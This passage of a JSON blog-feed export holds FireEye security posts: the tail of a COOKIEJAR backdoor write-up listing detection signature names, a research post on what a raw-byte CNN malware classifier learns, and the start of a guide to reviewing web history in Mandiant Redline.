Hardcoded configuration data within COOKIEJAR</span></p> \n<h4>Detecting the Techniques</h4> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p> <b>Product</b></p> </td> \n   <td width=\"312\" valign=\"top\"><p> <b>Signature</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"312\" valign=\"top\"><p>Network Security/MVX</p> </td> \n   <td width=\"312\" valign=\"top\">\n    <ul> \n     <li>APT.Backdoor.Linux64_COOKIEJAR_1</li> \n     <li>APT.Backdoor.Linux_COOKIEJAR_1</li> \n     <li>APT.Backdoor.Linux.COOKIEJAR</li> \n    </ul> </td> \n  </tr>\n </tbody>\n</table> \n<h4>Acknowledgements</h4> \n<ul> \n <li>Chris Gardner, Malware Analyst</li> \n <li>Fred House, Director, Engineering</li> \n</ul> \n<p> <i>More information on FireEye Endpoint Security's&nbsp;</i> <a href=\"https://fireeye.market/apps/292187\"><i>Logon Tracker Module</i></a> <i>&nbsp;including the module download and user manual are available in the&nbsp;</i> <a href=\"https://fireeye.market/apps/292187\"><i>FireEye Marketplace</i></a> <i>.</i></p>","descriptionType":"html","publishedDate":"Tue, 11 Aug 2020 17:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture1.png","linkMd5":"0d5f5752a4ac1c6c75e9e755d6dff874","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn56@2020_2/2020/08/24/14-11-05-133_a079c660a4a295dd.webp","destWidth":936,"destHeight":526,"sourceBytes":246313,"destBytes":91558,"author":"Nick Schroeder","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn56@2020_2/2020/08/24/14-11-05-133_a079c660a4a295dd.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn55@2020_5/2020/08/24/14-11-18-555_106eeb0b83043a81.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn13@2020_6/2020/08/24/14-11-18-798_11aaab9bf4b3b7bf.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn67@2020_1/2020/08/24/14-11-19-526_840099a0a3b1bc2d.webp"},"publishedOrCreatedDate":1598278264175},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"What are Deep Neural Networks Learning About Malware?","link":"http://www.fireeye.com/blog/threat-research/2018/12/what-are-deep-neural-networks-learning-about-malware.html","description":"<p>An increasing number of modern antivirus solutions rely on machine\n  learning (ML) techniques to protect users from malware. While ML-based\n  approaches, like FireEye Endpoint Security’s <a\n  href=\"https://www.fireeye.com/blog/products-and-services/2018/07/malwareguard-fireeye-machine-learning-model-to-detect-and-prevent-malware.html\">MalwareGuard</a>\n  capability, have done a great job at detecting new threats, they also\n  come with substantial development costs. Creating and curating a large\n  set of useful features takes significant amounts of time and expertise\n  from malware analysts and data scientists (note that in this context a\n  <i>feature</i> refers to a property or characteristic of the\n  executable that can be used to distinguish between goodware and\n  malware). In recent years, however, deep learning approaches have\n  shown impressive results in automatically learning feature\n  representations for complex problem domains, like images, speech, and\n  text. Can we take advantage of these advances in deep learning to\n  automatically learn how to detect malware without costly feature engineering?</p>\n <p>As it turns out, deep learning architectures, and in particular <i>\n    <a\n      href=\"https://en.wikipedia.org/wiki/Convolutional_neural_network\">convolutional\n      neural networks (CNNs</a>)</i>, can do a good job of detecting\n  malware simply by looking at the raw bytes of <a\n    href=\"https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format\">Windows\n    Portable Executable (PE) file</a>s. Over the last two years, FireEye\n  has been experimenting with deep learning architectures for malware\n  classification, as well as <a\n    href=\"https://arxiv.org/abs/1810.08280\">methods to evade them</a>.\n  Our experiments have demonstrated surprising levels of accuracy that\n  are competitive with traditional ML-based solutions, while avoiding\n  the costs of manual feature engineering. Since the <a\n    href=\"https://www.camlis.org/2017/jeffreyjohns\">initial presentation\n    of our findings</a>, other researchers have published similarly <a\n  href=\"https://arxiv.org/abs/1710.09435\">impressive</a> <a\n  href=\"https://openreview.net/forum?id=HkHrmM1PM\">results</a>, with\n  accuracy upwards of 96%.</p>\n <p>\n  <b>Since these deep learning models are only looking at the raw bytes\n    without any additional structural, semantic, or syntactic context,\n    how can they possibly be learning what separates goodware from\n  malware?</b> In this blog post, we answer this question by analyzing\n  FireEye’s deep learning-based malware classifier.</p>\n <table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> <tbody>\n    <tr>\n      <td width=\"534\" valign=\"top\"><p>\n          <u>Highlights</u></p> <ul\n          style=\"list-style-position: inside;\"> <li>FireEye’s deep\n            learning classifier can successfully identify malware using\n            only the unstructured bytes of the Windows PE file.</li>\n            <li>Import-based features, like names and function call\n            fingerprints, play a significant role in the features\n            learned across all levels of the classifier.</li> <li>Unlike\n            other deep learning application areas, where low-level\n            features tend to generally capture properties across all\n            classes, many of our low-level features focused on very\n            specific sequences primarily found in malware.</li>\n            <li>End-to-end analysis of the classifier identified\n            important features that closely mirror those created through\n            manual feature engineering, which demonstrates the\n            importance of classifier depth in capturing meaningful\n          features.</li> </ul> </td> </tr></tbody></table>\n <h4>Background</h4>\n <p>Before we dive into our analysis, let’s first discuss what a CNN\n  classifier is doing with Windows PE file bytes. Figure 1 shows the\n  high-level operations performed by the classifier while “learning”\n  from the raw executable data. We start with the raw byte\n  representation of the executable, absent any structure that might\n  exist (1). This raw byte sequence is <i>embedded</i> into a\n  high-dimensional space where each byte is replaced with an\n  n-dimensional vector of values (2). This embedding step allows the CNN\n  to learn relationships among the discrete bytes by moving them within\n  the n-dimensional <i>embedding space</i>. For example, if the bytes\n  0xe0 and 0xe2 are used interchangeably, then the CNN can move those\n  two bytes closer together in the embedding space so that the cost of\n  replacing one with the other is small. Next, we perform\n  <i>convolutions</i> over the embedded byte sequence (3). As we do this\n  across our entire training set, our <i>convolutional filters</i> begin\n  to learn the characteristics of certain sequences that differentiate\n  goodware from malware (4). In simpler terms, we slide a fixed-length\n  window across the embedded byte sequence and the convolutional filters\n  learn the important features from across those windows. Once we have\n  scanned the entire sequence, we can then <i>pool</i> the convolutional\n  activations to select the best features from each section of the\n  sequence (i.e., those that maximally activated the filters) to pass\n  along to the next level (5). In practice, the convolution and pooling\n  operations are used repeatedly in a hierarchical fashion to aggregate\n  many low-level features into a smaller number of high-level features\n  that are more useful for classification. Finally, we use the\n  aggregated features from our pooling as input to a <i>fully-connected\n    neural network</i>, which classifies the PE file sample as either\n  goodware or malware (6).</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture1.png\" />\n  <br /> <span class=\"type-XS\">Figure 1: High-level overview of a\n    convolutional neural network applied to raw bytes from a Windows PE files.</span></p>\n <p>The specific deep learning architecture that we analyze here\n  actually has five convolutional and max pooling layers arranged in a\n  hierarchical fashion, which allows it to learn complex features by\n  combining those discovered at lower levels of the hierarchy. To\n  efficiently train such a deep neural network, we must restrict our\n  input sequences to a fixed length – truncating any bytes beyond this\n  length or using special padding symbols to fill out smaller files. For\n  this analysis, we chose an input length of 100KB, though we have\n  experimented with lengths upwards of 1MB. We trained our CNN model on\n  more than 15 million Windows PE files, 80% of which were goodware and\n  the remainder malware. When evaluated against a test set of nearly 9\n  million PE files observed in the wild from June to August 2018, the\n  classifier achieves an accuracy of 95.1% and an <a\n    href=\"https://en.wikipedia.org/wiki/F1_score\">F1 score</a> of 0.96,\n  which are on the higher end of scores reported by previous work.</p>\n <p>In order to figure out what this classifier has learned about\n  malware, we will examine each component of the architecture in turn.\n  At each step, we use either a sample of 4,000 PE files taken from our\n  training data to examine broad trends, or a smaller set of six\n  artifacts from the <a\n  href=\"https://www.fireeye.com/blog/threat-research/2017/06/petya-ransomware-spreading-via-eternalblue-exploit.html\">NotPetya</a>,\n    <a\n  href=\"https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html\">WannaCry</a>,\n  and <a\n  href=\"https://www.fireeye.com/blog/threat-research/2017/10/backswing-pulling-a-badrabbit-out-of-a-hat.html\">BadRabbit</a>\n  ransomware families to examine specific features.</p>\n <h4>Bytes in (Embedding) Space</h4>\n <p>The embedding space can encode interesting relationships that the\n  classifier has learned about the individual bytes and determine\n  whether certain bytes are treated differently than others because of\n  their implied importance to the classifier’s decision. To tease out\n  these relationships, we will use two tools: (1) a dimensionality\n  reduction technique called <a\n    href=\"https://en.wikipedia.org/wiki/Multidimensional_scaling\">multi-dimensional\n    scaling (MDS)</a> and (2) a density-based clustering method called\n    <a\n  href=\"https://github.com/scikit-learn-contrib/hdbscan\">HDBSCAN</a>.\n  The dimensionality reduction technique allows us to move from the\n  high-dimensional embedding space to an approximation in\n  two-dimensional space that we can easily visualize, while still\n  retaining the overall structure and organization of the points.\n  Meanwhile, the clustering technique allows us to identify dense groups\n  of points, as well as outliers that have no nearby points. The\n  underlying intuition being that outliers are treated as “special” by\n  the model since there are no other points that can easily replace them\n  without a significant change in upstream calculations, while dense\n  clusters of points can be used interchangeably.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture2.png\" />\n  <br /> <span class=\"type-XS\">Figure 2: Visualization of the byte\n    embedding space using multi-dimensional scaling (MDS) and clustered\n    with hierarchical density-based clustering (HDBSCAN) with clusters\n    (Left) and outliers labeled (Right).</span></p>\n <p>On the left side of Figure 2, we show the two-dimensional\n  representation of our byte embedding space with each of the clusters\n  labeled, along with an outlier cluster labeled as -1. As you can see,\n  the vast majority of bytes fall into one large catch-all class\n  (Cluster 3), while the remaining three clusters have just two bytes\n  each. Though there are no obvious semantic relationships in these\n  clusters, the bytes that were included are interesting in their own\n  right – for instance, Cluster 0 includes our special padding byte that\n  is only used when files are smaller than the fixed-length cutoff, and\n  Cluster 1 includes the ASCII character ‘r.’</p>\n <p>What is more fascinating, however, is the set of outliers that the\n  clustering produced, which are shown in the right side of Figure 3. \n  Here, there are a number of intriguing trends that start to appear.\n  For one, each of the bytes in the range 0x0 to 0x6 are present, and\n  these bytes are often used in short forward jumps or when registers\n  are used as instruction arguments (e.g., eax, ebx, etc.).\n  Interestingly, 0x7 and 0x8 are grouped together in Cluster 2, which\n  may indicate that they are used interchangeably in our training data\n  even though 0x7 could also be interpreted as a register argument.\n  Another clear trend is the presence of several ASCII characters in the\n  set of outliers, including ‘\\n’, ‘A’, ‘e’, ‘s’, and ‘t.’ Finally, we\n  see several opcodes present, including the call instruction (0xe8),\n  loop and loopne (0xe0, 0xe2), and a breakpoint instruction (0xcc).</p>\n <p>Given these findings, we immediately get a sense of what the\n  classifier might be looking for in low-level features: ASCII text and\n  usage of specific types of instructions.</p>\n <h4>Deciphering Low-Level Features</h4>\n <p>The next step in our analysis is to examine the low-level features\n  learned by the first layer of convolutional filters. In our\n  architecture, we used 96 convolutional filters at this layer, each of\n  which learns basic building-block features that will be combined\n  across the succeeding layers to derive useful high-level features.\n  When one of these filters sees a byte pattern that it has learned in\n  the current convolution, it will produce a large <i>activation value\n  </i>and we can use that value as a method for identifying the most\n  interesting bytes for each filter. Of course, since we are examining\n  the raw byte sequences, this will merely tell us which file offsets to\n  look at, and we still need to bridge the gap between the raw byte\n  interpretation of the data and something that a human can understand.\n  To do so, we parse the file using <a\n  href=\"https://github.com/erocarrera/pefile\">PEFile</a> and apply <a\n  href=\"https://binary.ninja/\">BinaryNinja’s</a> disassembler to\n  executable sections to make it easier to identify common patterns\n  among the learned features for each filter.</p>\n <p>Since there are a large number of filters to examine, we can narrow\n  our search by getting a broad sense of which filters have the\n  strongest activations across our sample of 4,000 Windows PE files and\n  where in those files those activations occur. In Figure 3, we show the\n  locations of the 100 strongest activations across our 4,000-sample\n  dataset. This shows a couple of interesting trends, some of which\n  could be expected and others that are perhaps more surprising. For\n  one, the majority of the activations at this level in our architecture\n  occur in the ‘.text’ section, which typically contains executable\n  code. When we compare the ‘.text’ section activations between malware\n  and goodware subsets, there are significantly more activations for the\n  malware set, meaning that even at this low level there appear to be\n  certain filters that have keyed in on specific byte sequences\n  primarily found in malware. Additionally, we see that the ‘UNKNOWN’\n  section– basically, any activation that occurs outside the valid\n  bounds of the PE file – has many more activations in the malware group\n  than in goodware. This makes some intuitive sense since many\n  obfuscation and evasion techniques rely on placing data in\n  non-standard locations (e.g., embedding PE files within one another).</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture3.png\" />\n  <br /> <span class=\"type-XS\">Figure 3: Distribution of low-level\n    activation locations across PE file headers and sections. Overall\n    distribution of activations (Left), and activations for\n    goodware/malware subsets (Right). UNKNOWN indicates an area outside\n    the valid bounds of the file and NULL indicates an empty section name.</span></p>\n <p>We can also examine the activation trends among the convolutional\n  filters by plotting the top-100 activations for each filter across our\n  4,000 PE files, as shown in Figure 4. Here, we validate our intuition\n  that some of these filters are overwhelmingly associated with features\n  found in our malware samples. In this case, the activations for Filter\n  57 occur almost exclusively in the malware set, so that will be an\n  important filter to look at later in our analysis. The other main\n  takeaway from the distribution of filter activations is that the\n  distribution is quite skewed, with only two filters handling the\n  majority of activations at this level in our architecture. In fact,\n  some filters are not activated at all on the set of 4,000 files we are analyzing.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture4.png\" />\n  <br /> <span class=\"type-XS\">Figure 4: Distribution of activations\n    over each of the 96 low-level convolutional filters. Overall\n    distribution of activations (Left), and activations for\n    goodware/malware subsets (Right).</span></p>\n <p>Now that we have identified the most interesting and active filters,\n  we can disassemble the areas surrounding their activation locations\n  and see if we can tease out some trends. In particular, we are going\n  to look at Filters 83 and 57, both of which were important filters in\n  our model based on activation value. The disassembly results for these\n  filters across several of our ransomware artifacts is shown in Figure 5.</p>\n <p>For Filter 83, the trend in activations becomes pretty clear when we\n  look at the ASCII encoding of the bytes, which shows that the filter\n  has learned to detect certain types of imports. If we look closer at\n  the activations (denoted with a ‘*’), these always seem to include\n  characters like ‘r’, ‘s’, ‘t’, and ‘e’, all of which were identified\n  as outliers or found in their own unique clusters during our embedding\n  analysis.  When we look at the disassembly of Filter 57’s activations,\n  we see another clear pattern, where the filter activates on sequences\n  containing multiple push instructions and a call instruction –\n  essentially, identifying function calls with multiple parameters.</p>\n <p>In some ways, we can look at Filters 83 and 57 as detecting two\n  sides of the same overarching behavior, with Filter 83 detecting the\n  imports and 57 detecting the potential use of those imports (i.e., by\n  fingerprinting the number of parameters and usage). Due to the\n  independent nature of convolutional filters, the relationships between\n  the imports and their usage (e.g., which imports were used where) is\n  lost, and that the classifier treats these as two completely\n  independent features.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture5.png\" />\n  <br /> <span class=\"type-XS\">Figure 5: Example disassembly of\n    activations for filters 83 (Left) and 57 (Right) from ransomware\n    samples. Lines prepended with '*' contain the actual filter\n    activations, others are provided for context.</span></p>\n <p>Aside from the import-related features described above, our analysis\n  also identified some filters that keyed in on particular byte\n  sequences found in functions containing exploit code, such as\n  DoublePulsar or EternalBlue. For instance, Filter 94 activated on\n  portions of the EternalRomance exploit code from the BadRabbit\n  artifact we analyzed. Note that these low-level filters did not\n  necessarily detect the specific exploit activity, but instead activate\n  on byte sequences within the surrounding code in the same function.</p>\n <p>These results indicate that the classifier has learned some very\n  specific byte sequences related to ASCII text and instruction usage\n  that relate to imports, function calls, and artifacts found within\n  exploit code. This finding is surprising because in other machine\n  learning domains, such as images, low-level filters often learn\n  generic, reusable features across all classes.</p>\n <h4>Bird’s Eye View of End-to-End Features</h4>\n <p>While it seems that lower layers of our CNN classifier have learned\n  particular byte sequences, the larger question is: does the depth and\n  complexity of our classifier (i.e., the number of layers) help us\n  extract more meaningful features as we move up the hierarchy? To\n  answer this question, we have to examine the end-to-end relationships\n  between the classifier’s decision and each of the input bytes. This\n  allows us to directly evaluate each byte (or segment thereof) in the\n  input sequence and see whether it pushed the classifier toward a\n  decision of malware or goodware, and by how much. To accomplish this\n  type of end-to-end analysis, we leverage the <a\n    href=\"http://papers.nips.cc/paper/7062-a-unified-approach-to-interpreting-model-predictions\">SHapley\n    Additive exPlanations (SHAP)</a> framework developed by Lundberg and\n  Lee. In particular, we use the <a\n  href=\"https://github.com/slundberg/shap\">GradientSHAP</a> method that\n  combines a number of techniques to precisely identify the\n  contributions of each input byte, with positive SHAP values indicating\n  areas that can be considered to be malicious features and negative\n  values for benign features.</p>\n <p>After applying the GradientSHAP method to our ransomware dataset, we\n  noticed that many of the most important end-to-end features were not\n  directly related to the types of specific byte sequences that we\n  discovered at lower layers of the classifier. Instead, many of the\n  end-to-end features that we discovered mapped closely to features\n  developed from manual feature engineering in our traditional ML\n  models. As an example, the end-to-end analysis on our ransomware\n  samples identified several malicious features in the checksum portion\n  of the PE header, which is commonly used as a feature in traditional\n  ML models. Other notable end-to-end features included the presence or\n  absence of certain directory information related to certificates used\n  to sign the PE files, anomalies in the section table that define the\n  properties of the various sections of the PE file, and specific\n  imports that are often used by malware (e.g., GetProcAddress and VirtualAlloc).</p>\n <p>In Figure 6, we show the distribution of SHAP values across the file\n  offsets for the worm artifact of the WannaCry ransomware family. Many\n  of the most important malicious features found in this sample are\n  focused in the PE header structures, including previously mentioned\n  checksum and directory-related features. One particularly interesting\n  observation from this sample, though, is that it contains another PE\n  file embedded within it, and the CNN discovered two end-to-end\n  features related to this. First, it identified an area of the section\n  table that indicated the ‘.data’ section had a virtual size that was\n  more than 10x larger than the stated physical size of the section.\n  Second, it discovered maliciously-oriented imports and exports within\n  the embedded PE file itself. Taken as a whole, these results show that\n  the depth of our classifier appears to have helped it learn more\n  abstract features and generalize beyond the specific byte sequences we\n  observed in the activations at lower layers.</p>\n <p>\n  <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture6.png\" />\n  <br /> <span class=\"type-XS\">Figure 6: SHAP values for file offsets\n    from the worm artifact of WannaCry. File offsets with positive\n    values are associated with malicious end-to-end features, while\n    offsets with negative values are associated with benign features.</span></p>\n <h4>Summary</h4>\n <p>In this blog post, we dove into the inner workings of FireEye’s\n  byte-based deep learning classifier in order to understand what it,\n  and other deep learning classifiers like it, are learning about\n  malware from its unstructured raw bytes. Through our analysis, we have\n  gained insight into a number of important aspects of the classifier’s\n  operation, weaknesses, and strengths:</p>\n <ul style=\"list-style-position: inside;\"> <li>\n    <b>Import Features: </b>Import-related features play a large role in\n    classifying malware across all levels of the CNN architecture. We\n    found evidence of ASCII-based import features in the embedding\n    layer, low-level convolutional features, and end-to-end\n  features.</li> <li>\n    <b>Low-Level Instruction Features: </b>Several features discovered\n    at the lower layers of our CNN classifier focused on sequences of\n    instructions that capture specific behaviors, such as particular\n    types of function calls or code surrounding certain types of\n    exploits. In many cases, these features were primarily associated\n    with malware, which runs counter to the typical use of CNNs in other\n    domains, such as image classification, where low-level features\n    capture generic aspects of the data (e.g., lines and simple shapes).\n    Additionally, many of these low-level features did not appear in the\n    most malicious end-to-end features.</li> <li>\n    <b>End-to-End Features:</b> Perhaps the most interesting result of\n    our analysis is that many of the most important maliciously-oriented\n    end-to-end features closely map to common manually-derived features\n    from traditional ML classifiers. Features like the presence or\n    absence of certificates, obviously mangled checksums, and\n    inconsistencies in the section table do not have clear analogs to\n    the lower-level features we uncovered. Instead, it appears that the\n    depth and complexity of our CNN classifier plays a key role in\n    generalizing from specific byte sequences to meaningful and\n    intuitive features.</li> </ul>\n <p>It is clear that deep learning offers a promising path toward\n  sustainable, cutting-edge malware classification. At the same time,\n  significant improvements will be necessary to create a viable\n  real-world solution that addresses the shortcomings discussed in this\n  article. The most important next step will be improving the\n  architecture to include more information about the structural,\n  semantic, and syntactic context of the executable rather than treating\n  it as an unstructured byte sequence. By adding this specialized domain\n  knowledge directly into the deep learning architecture, we allow the\n  classifier to focus on learning relevant features for each context,\n  inferring relationships that would not be possible otherwise, and\n  creating even more robust end-to-end features with better\n  generalization properties.</p>\n <p>The content of this blog post is based on research presented at the\n    <a href=\"https://www.camlis.org/\">Conference on Applied Machine\n    Learning for Information Security (CAMLIS)</a> in Washington, DC on\n  Oct. 12-13, 2018. Additional material, including slides and a video of\n  the presentation, can be found on the <a\n    href=\"https://www.camlis.org/scott-coull/\">conference website</a>.</p>\n <p>An extended version of the research presented in this blog post can\n  be found in our <a\n    href=\"https://ieeexplore.ieee.org/abstract/document/8844623\">peer-reviewed\n  paper</a> from the <a\n    href=\"https://www.ieee-security.org/TC/SPW2019/DLS/\">IEEE Deep\n    Learning and Security workshop</a>. A <a\n    href=\"https://arxiv.org/abs/1903.04717\">publicly-available version\n    of the paper</a> is also available.</p>\n","descriptionType":"html","publishedDate":"Thu, 13 Dec 2018 17:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture1.png","linkMd5":"ac29061db60fbec419c9722e62d6c091","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn12@2020_2/2020/08/24/14-11-06-811_78a31453e5b0abcd.webp","destWidth":941,"destHeight":547,"sourceBytes":98248,"destBytes":39122,"author":"Scott Coull","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture1.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn12@2020_2/2020/08/24/14-11-06-811_78a31453e5b0abcd.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture2.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn35@2020_2/2020/08/24/14-11-20-529_7666a81e51bce9e0.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture3.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn3@2020_3/2020/08/24/14-11-18-224_722fb7b52f1faed8.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture4.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn2@2020_3/2020/08/24/14-11-18-943_8aef39ffb60c8965.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture5.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn89@2020_1/2020/08/24/14-11-16-925_fdb924ba7cb37001.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/NeuralNetworks/Picture6.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn64@2020_6/2020/08/24/14-11-17-558_28e3d3e1453da909.webp"},"publishedOrCreatedDate":1598278264190},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"How Will I Fill This Web Historian-Shaped Hole in My Heart?","link":"http://www.fireeye.com/blog/threat-research/2013/09/fill-web-historianshaped-hole-heart.html","description":"<div class=\"c00 c00v1\"> \n <p>With the recent integration of Mandiant Web Historian™ into<a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\"> Mandiant Redline™</a>, you may be asking \"How do I review my Web History using Redline?\" If so, then follow along as I explain how to collect and review web history data in Redline - with a focus on areas where the workflow and features differ from that of Web Historian.</p> \n <p>For those of you unfamiliar with Redline, it is Mandiant's premier free tool, providing host investigative capabilities to help users find signs of malicious activity through memory and file analysis and the development of a threat assessment profile.</p> \n <h3>Configuring Web History Data Collection</h3> \n <p>Web Historian provided three options for choosing how to find web history data that you want to analyze: scan my local system, scan a profile folder, and parse an individual history file. Redline allows you to accomplish all three of these operations using a single option, <b>Analyze this Computer</b>, which is found under the Main Menu in the upper left corner. Specifying the path to a profile folder or a history file will require some additional configuration:</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Finding-your-web-history-data-Web-Historian-Left-vs.-Redline-Right.png\"><img width=\"614\" height=\"261\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Finding-your-web-history-data-Web-Historian-Left-vs.-Redline-Right-1024x435.png\" class=\" wp-image-5173 \" /></a>Figure 1: Finding your web history data Web Historian (Left) vs. Redline (Right)\n <p>Click on <b>Analyze this Computer</b> to begin configuring your analysis session. To ensure that Redline collects your desired web history data, click the link to <b>Edit your script</b> <i>. </i>On the <b>View and Edit Your Script</b> window are several options; take a look around and turn on any and all data that might interest you. For our purposes, we will be focusing on the <b>Browser History</b> options underneath the <b>Network</b> <i> </i>tab. This section contains all of the familiar options from Web Historian; simply select the boxes corresponding to the data you wish to collect.</p> \n <p>One difference you may notice is the absence of an option to specify the browser(s) you would like to target. You can now find that option by selecting <b>Show Advanced Parameters</b> <i> </i>from the upper right corner of the window. Once advanced parameters are enabled, simply type the name of any browser(s) you would like to target, each on its own separate line in the <b>Target Browser</b> field. To have Redline collect any web history data regardless of browser, just leave this field empty.</p> \n <p>You may also notice that enabling advanced parameters activates a field for <b>History Files Location</b>. As you may have guessed, this is where you can specify a path to a profile folder or history file to analyze directly, as you were able to do in Web Historian.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Configuring-Redline-to-Collect-Browser-History-Data.png\"><img width=\"614\" height=\"336\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-2-Configuring-Redline-to-Collect-Browser-History-Data-1024x560.png\" class=\" wp-image-5174 \" /></a>Figure 2: Configuring Redline to Collect Browser History Data\n <p>Now that you have finished configuring your script, choose a location to save your analysis session and then hit <b>OK</b> <i>. </i>Redline will run the script, which<i> </i>will require Administrator privileges and may trigger a UAC prompt before running depending on how your system is configured. After a brief collecting and processing time, your web history data will be ready for review.</p> \n <h3>Reviewing your Data</h3> \n <p>For the actual review of your web history data, you should feel right at home in Redline. Just like Web Historian, Redline uses a sortable, searchable, configurable table view for each of the individual categories of web history data.</p> \n <a href=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-Displaying-your-web-history-data-for-review-in-both-Web-Historian-behind-and-Redline-front.png\"><img width=\"581\" height=\"420\" src=\"https://www.fireeye.com/content/dam/legacy/ammo/Figure-3-Displaying-your-web-history-data-for-review-in-both-Web-Historian-behind-and-Redline-front.png\" class=\" wp-image-5175 \" /></a>Figure 3: Displaying your web history data for review in both Web Historian (behind) and Redline (front)\n <p>Although similar, Redline does have a few minor differences in how it visualizes your data:</p> \n <ul> \n  <li>Redline does not break the data into pages; instead it will discretely page in large data sets (25k+ rows) automatically as you scroll down through the list.</li> \n  <li>To configure the table view, you will need to manipulate the column headers for ordering and resizing, and right-click on a column header to show and hide columns - as opposed to using the column configuration menu in Web Historian.</li> \n  <li>Searching and simple filtering is done in each individual table view and is not applied globally. To access the find<i> </i>options, either press the magnifying glass in the bottom right corner, or press <b>Ctrl-f</b> while a table view is selected.</li> \n  <li>To export your data to a CSV (comma separated values) format file, click on export<i> </i>in the bottom right corner. Like Web Historian, Redline will only export data currently in the table view. If you applied any filtering or tags, those will affect the data as it is exported.</li> \n </ul> \n <p>In addition to the features that have always been available in Web Historian, Redline also allows you to review your web history with its full suite of analytical capabilities and investigative tools. Check out the Redline user guide for a full description of these capabilities. Here are just a few of the most popular:</p> \n <ul> \n  <li>Timeline provides a chronological listing of all web-based events (e.g., URL last browsed to, File Download Started, etc.) in a single heterogeneous display. You can employ this to follow the activities of a user or attacker as they played out on the system. You can also quickly reduce your target investigative scope using the Timeline's powerful filtering capabilities.</li> \n  <li>Use tags and comments to mark-up your findings as you perform your investigation, making it easier to keep track of what you have seen while moving forward. You can then go back and export those results into your favorite reporting solution.</li> \n  <li>Use Indicators of Compromise (IOCs) as a quick way to determine if your system contains any potential security breaches or other evidence of compromise. Visit <a target=\"_blank\" href=\"http://www.openioc.org/\">http://www.openioc.org/</a> to learn more about IOCs.</li> \n  <li>Last but not least, Redline gives you the ability to examine an entire system worth of metadata. With Redline, you are not simply restricted to Web History related data; you can investigate security incidents with the scope and context of the full system.</li> \n </ul> \n <p>If your favorite feature from Web Historian has not yet been included in Redline (Graphing, Complex Filtering, etc.), feel free to make a request using one of the contact methods specified below. We will be taking feedback into consideration when choosing what the Redline team works on in the future.</p> \n <p>As always, feel free to <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/company/contact-us.html\">contact us</a> with send any additional questions. And just in case you do not already have it, the latest version of Redline (v1.10 as of the time of this writing) can always be found <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">here</a>.</p> \n</div>","descriptionType":"html","publishedDate":"Thu, 19 Sep 2013 01:11:32 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/legacy/ammo/Figure-1-Finding-your-web-history-data-Web-Historian-Left-vs.-Redline-Right-1024x435.png","linkMd5":"1d3a4fb7460f53d73382c8ee5e8920d3","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn88@2020_3/2020/08/24/14-11-04-879_04170322f426cd1f.webp","destWidth":1024,"destHeight":435,"sourceBytes":167219,"destBytes":32260,"author":"Ted 